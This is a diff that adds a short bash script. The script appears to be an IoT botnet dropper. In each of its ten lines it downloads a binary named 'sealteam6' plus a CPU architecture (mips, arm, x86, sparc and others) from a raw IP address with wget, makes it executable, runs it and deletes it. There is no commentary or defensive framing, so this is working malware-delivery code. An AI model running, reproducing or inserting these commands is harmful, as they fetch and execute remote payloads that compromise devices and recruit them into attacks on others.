@@ -1,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.61/sealteam6mips; chmod +x sealteam6mips; ./sealteam6mips; rm -rf sealteam6mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.61/sealteam6mipsel; chmod +x sealteam6mipsel; ./sealteam6mipsel; rm -rf sealteam6mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.61/sealteam6sh4; chmod +x sealteam6sh4; ./sealteam6sh4; rm -rf sealteam6sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.61/sealteam6x86; chmod +x sealteam6x86; ./sealteam6x86; rm -rf sealteam6x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.61/sealteam6armv6l; chmod +x sealteam6armv6l; ./sealteam6armv6l; rm -rf sealteam6armv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.61/sealteam6i686; chmod +x sealteam6i686; ./sealteam6i686; rm -rf sealteam6i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.61/sealteam6ppc; chmod +x sealteam6ppc; ./sealteam6ppc; rm -rf sealteam6ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.61/sealteam6i586; chmod +x sealteam6i586; ./sealteam6i586; rm -rf sealteam6i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.61/sealteam6m68k; chmod +x sealteam6m68k; ./sealteam6m68k; rm -rf sealteam6m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.61/sealteam6sparc; chmod +x sealteam6sparc; ./sealteam6sparc; rm -rf sealteam6sparc
